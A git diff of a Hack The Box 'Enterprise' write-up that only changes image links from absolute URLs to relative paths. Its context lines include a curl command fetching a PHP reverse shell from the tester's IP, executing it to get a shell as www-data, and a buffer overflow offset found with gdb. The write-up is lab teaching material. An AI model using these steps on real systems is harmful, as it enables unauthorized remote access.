@@ -58,7 +58,7 @@ Noteworthy:
 The website on port 80 shows some content but it does not render correctly.
 When browsing to the hostname _enterprise.htb_ it renders correctly and shows a blog that is hosted on **WordPress**.
 
-![WordPress page](https://kyuu-ji.github.io/htb-write-up/enterprise/enterprise_web-1.png)
+![WordPress page](enterprise_web-1.png)
 
 All articles are written by the user _william.riker_.
 
@@ -74,7 +74,7 @@ It did not find anything interesting.
 The website on port 8080 is hosted on **Joomla** with the title _"Ten Forward"_.
 This web page has a login form but we do not have any credentials yet:
 
-![Login page on Joomla](https://kyuu-ji.github.io/htb-write-up/enterprise/enterprise_web-2.png)
+![Login page on Joomla](enterprise_web-2.png)
 
 ## Checking HTTPS (Port 443)
 
@@ -340,7 +340,7 @@ curl 10.10.14.17/php-reverse-shell-p9005.php -o shell.php
 
 Running it by clicking on it on the index page:
 
-![Executing shell.php](https://kyuu-ji.github.io/htb-write-up/enterprise/enterprise_web-3.png)
+![Executing shell.php](enterprise_web-3.png)
 
 After executing it the listener on my IP and port 9005 starts a reverse shell as _www-data_.
 When checking the IP address with `ip a` it shows different interfaces and also 10.10.10.61 which is the target box.
@@ -441,7 +441,7 @@ gdb-peda$ run
 
 After running it with that pattern, it found the offset at 212 characters in:
 
-![Offset on 212](https://kyuu-ji.github.io/htb-write-up/enterprise/enterprise_re-1.png)
+![Offset on 212](enterprise_re-1.png)
 
 Also **ASLR** is disabled on the box which doesn't have to be bypassed:
 ```markdown
